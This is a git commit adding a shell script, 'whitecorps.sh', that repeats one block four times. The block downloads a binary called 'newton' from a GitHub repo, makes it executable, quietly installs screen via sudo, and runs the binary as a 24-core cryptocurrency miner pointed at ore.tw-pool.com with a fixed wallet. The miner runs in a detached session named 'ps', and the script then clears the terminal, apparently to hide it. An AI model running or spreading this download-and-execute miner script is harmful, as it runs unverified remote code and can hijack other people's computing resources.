9bcb83adcb0d86dc010562823d6e12cd8c21e538
obisumila <obisumila@gmail.com>
2024-10-07 05:32:44 +0800

    Add files via upload

---
+++ whitecorps.sh
@@ -0,0 +1,40 @@
+wget https://github.com/obisumila/glowing-octo-happiness/raw/refs/heads/main/newton ;
+chmod +x newton ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./newton --url ws://ore.tw-pool.com:5487/mine mine --username 3LowYTECCZTbpAH2t63Uo1X17wr91e46PzHJ4uYM3pgW.XOXO --cores 24 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/glowing-octo-happiness/raw/refs/heads/main/newton ;
+chmod +x newton ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./newton --url ws://ore.tw-pool.com:5487/mine mine --username 3LowYTECCZTbpAH2t63Uo1X17wr91e46PzHJ4uYM3pgW.XOXO --cores 24 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/glowing-octo-happiness/raw/refs/heads/main/newton ;
+chmod +x newton ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./newton --url ws://ore.tw-pool.com:5487/mine mine --username 3LowYTECCZTbpAH2t63Uo1X17wr91e46PzHJ4uYM3pgW.XOXO --cores 24 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/glowing-octo-happiness/raw/refs/heads/main/newton ;
+chmod +x newton ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./newton --url ws://ore.tw-pool.com:5487/mine mine --username 3LowYTECCZTbpAH2t63Uo1X17wr91e46PzHJ4uYM3pgW.XOXO --cores 24 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
